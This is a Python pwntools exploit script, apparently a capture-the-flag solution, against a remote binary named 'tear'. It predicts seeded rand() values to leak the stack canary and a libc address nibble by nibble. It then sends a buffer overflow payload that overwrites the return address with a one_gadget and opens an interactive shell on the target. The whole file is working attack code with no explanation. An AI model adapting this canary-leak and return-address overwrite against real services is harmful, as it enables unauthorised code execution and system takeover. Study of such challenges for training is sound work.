from pwn import *
from ctypes import CDLL
#io = process("./tear",aslr=True)
io = remote("10.100.0.43",10002)
libc = ELF("./libc.so.6")
cdll_libc = CDLL('libc.so.6')
cdll_libc.srand(0x7b534341)

def brute_half_byte(s):
    state = s # init state
    i = 0
    flipped = False

    while True:
        i += 1
        if (i == 0x10): # risky, but time issue
            # prob some byte between 0x8-0xf
            io.sendlineafter(b"relieved.",b"101")
            io.sendlineafter(b"luck",b"?") # make guess unchanged
            io.sendlineafter(b"choice",b"-")
            io.sendlineafter(b"minus...?",str(0x80000000).encode())
            cdll_libc.rand()

            state = state # state no change, just writing for clarity
            flipped = True
            continue

        cur_rand = cdll_libc.rand()
        target = cur_rand & 0xfffffff
        state = (state&0xfffff00) + ord('?') 
        diff = abs(target-state)    

        if (target > state):
            io.sendlineafter(b"relieved.",b"101")
            io.sendlineafter(b"luck",b"?") # to choose back guess
            io.sendlineafter(b"choice",b"+")
            io.sendlineafter(b"plus...?",str(diff).encode())
    
        else:
            io.sendlineafter(b"relieved.",b"101")
            io.sendlineafter(b"luck",b"?")
            io.sendlineafter(b"choice",b"-")
            io.sendlineafter(b"minus...?",str(diff).encode())
         

        state = target

        resp = io.recvuntil(b"..")
        if b"wow" in resp:
            # half byte match
            io.sendline(b"2069054273")
    
            # have to do this for some reason
            io.sendlineafter(b"relieved.",b"101")
            io.sendlineafter(b"luck",b"A")
            io.sendlineafter(b"choice",b"-")
            cdll_libc.rand() 

            if not flipped:
                return cur_rand>>28
            else:
                return (cur_rand>>28)+0x8



def brute_qword(idx,start,end,known=0):
    # idx for array access, start byte, end byte
    # [0...3], start=0,end=4, up to but not including the end'th byte
    qword = known

    for i in range(start*2,end*2):
        # load the ptr we want to leak
        io.sendlineafter(b"relieved.",b"101")
        io.sendlineafter(b"luck",idx.to_bytes(1,"little"))
        io.sendlineafter(b"choice",b"*")
        io.sendlineafter(b"multiply...?",str(0x1 << 4*(7-i)).encode())
        cdll_libc.rand() 

        new_half_byte = brute_half_byte(qword << 4*(7-i))
        qword = (new_half_byte<<(4*i)) + qword

    log.info("QWORD BRUTE FINISH")
    return qword


canary = (brute_qword(0xc,0,4)<<32) + (brute_qword(0xb,1,4))
log.info("CANARY: " + hex(canary))

one_gadget = brute_qword(0x1b,1,3,0xe3) + 516820
log.info("ONE GADGET: " + hex(one_gadget))


exploit = b"A"*0x108 + p64(canary) + p64(0) + one_gadget.to_bytes(3,"little")

io.sendlineafter(b"relieved.",b"102")
io.sendafter(b"skill.",exploit)

io.sendline(b"ls -la")
#gdb.attach(io,gdbscript="break *0x0000555555555a53")
io.interactive()
